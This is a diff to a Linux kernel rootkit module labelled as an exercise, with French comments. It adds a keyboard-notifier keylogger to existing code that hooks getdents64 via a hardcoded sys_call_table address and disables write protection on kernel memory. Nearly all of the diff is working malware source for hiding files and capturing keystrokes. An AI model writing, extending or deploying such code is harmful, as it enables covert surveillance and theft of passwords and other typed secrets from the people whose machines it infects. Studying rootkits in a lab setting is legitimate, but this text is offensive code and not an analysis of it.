@@ -5,10 +5,11 @@
 #include <linux/dirent.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
+#include <linux/keyboard.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Rootkit Exercise");
-MODULE_DESCRIPTION("Rootkit with getdents64 hooking");
+MODULE_DESCRIPTION("Rootkit with getdents64 hooking and keylogger");
 
 // Adresse statique de sys_call_table
 unsigned long sys_call_table = 0xffffffffa5200320;
@@ -16,7 +17,11 @@ unsigned long sys_call_table = 0xffffffffa5200320;
 // Pointeurs pour stocker les adresses des fonctions d'origine
 asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
 
-// Fonctions pour rendre la mémoire en lecture/écriture et lecture seule
+// Buffer pour stocker les frappes de clavier
+static char keystroke_buffer[1024];
+static int buffer_index = 0;
+
+// Fonction pour rendre la mémoire en lecture/écriture et lecture seule
 void make_rw(unsigned long address) {
     unsigned int level;
     pte_t *pte = lookup_address(address, &level);
@@ -72,6 +77,24 @@ asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *
     return nread;
 }
 
+// Fonction pour enregistrer les frappes de clavier
+static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
+    struct keyboard_notifier_param *param = _param;
+
+    if (code == KBD_KEYSYM && param->down) {
+        keystroke_buffer[buffer_index++] = param->value;
+        if (buffer_index >= sizeof(keystroke_buffer))
+            buffer_index = 0; // Réinitialise le buffer s'il est plein
+    }
+
+    return NOTIFY_OK;
+}
+
+// Structure pour enregistrer le keylogger
+static struct notifier_block keylogger_notifier = {
+    .notifier_call = keylogger_notify,
+};
+
 // Initialisation du module
 static int __init rootkit_init(void) {
     printk(KERN_INFO "rootkit_init : Début\n");
@@ -85,6 +108,9 @@ static int __init rootkit_init(void) {
 
     // Rendre la mémoire de sys_call_table en lecture seule
     make_ro(sys_call_table);
+
+    // Enregistrer le keylogger
+    register_keyboard_notifier(&keylogger_notifier);
 
     printk(KERN_INFO "rootkit_init : Terminé\n");
     return 0;
@@ -102,6 +128,9 @@ static void __exit rootkit_exit(void) {
 
     // Rendre la mémoire de sys_call_table en lecture seule
     make_ro(sys_call_table);
+
+    // Décharger le keylogger
+    unregister_keyboard_notifier(&keylogger_notifier);
 
     printk(KERN_INFO "rootkit_exit : Module déchargé\n");
 }
